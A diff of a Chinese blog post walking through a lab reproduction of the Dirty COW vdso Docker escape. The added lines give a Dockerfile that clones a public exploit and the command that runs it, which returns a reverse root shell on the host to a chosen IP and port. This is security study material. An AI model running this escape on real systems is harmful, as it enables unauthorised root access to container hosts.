@@ -9,6 +9,8 @@ category: Sec
 
 最近出比赛题用到Docker，于是就想到了脏牛火的那段时间有一个利用它做Docker逃逸的PoC。再一看，发现和`vdso`有关，恰好最近研究溢出也遇到了这个东西（在我的[另一篇博文](http://aptx4869.me/ctf/2017/09/08/Overflow.html)中）。
 
+原作者演示的是`容器中的root用户`提权到`VM中的root用户`；我们这里则在镜像中加入一个普通用户`ubuntu`，演示从`容器中的普通用户`提权到`VM中的root用户`。
+
 ### 0x01 环境搭建
 
 **VM**
@@ -106,31 +108,49 @@ docker-compose -v
 
 由于我们使用了国内的Docker仓库，所以也许需要在`Dockerfile`下稍微改动一下。这里同样涉及到更新源的问题。同样地，我在`Dockerfile`把源先给更换成了上海交通大学的源。
 
+所以最终我们实验的`Dockerfile`如下：
+
 ```dockerfile
 FROM registry.docker-cn.com/library/ubuntu:14.04
 
 RUN mv /etc/apt/sources.list /etc/apt/sources.list.bak
+
 ADD ./sources.list /etc/apt/
+RUN apt-get update
+RUN apt-get install -y build-essential
+RUN apt-get install -y nasm
+RUN apt-get install -y git
+
+RUN useradd --create-home ubuntu
+WORKDIR /home/ubuntu/
+RUN git clone https://github.com/scumjr/dirtycow-vdso.git
+RUN chown -R ubuntu:ubuntu /home/ubuntu/dirtycow-vdso
+
+EXPOSE 1234
+
+CMD /bin/bash
 ```
+
+执行下面的命令来创建并运行容器：
 
 ```bash
 docker-compose run dirtycow /bin/bash
 ```
+
+**注意：除了之前的环境搭建外，到目前为止，以上操作均在普通用户权限下进行（我这里的普通用户叫做`br`），也没有任何的`sudo`！**
 
 建议到这里也可以对VM做一个快照。这个Docker逃逸只能做一次，成功后退出`root shell`再次执行攻击时会失败，具体原因我还没有深入了解。
 
 进入以后执行：
 
 ```bash
-cd /
-./runnit.sh
-cd dirtycow-vdso
+su ubuntu
+cd /home/ubuntu/dirtycow-vdso
+make
 ./0xdeadbeef 172.18.0.2:10000
 ```
 
 由于最后获得的事实上是一个反弹shell，所以要给出反弹的IP和端口。端口可以随意设置，IP可以用`ifconfig`查看。我对Docker的网络机制不了解，以后记得去研究一下。
-
-**注意，到目前为止，以上操作均在普通用户权限下进行（我这里的普通用户叫做`br`），也没有任何的`sudo`！**
 
 看一下截图：
 
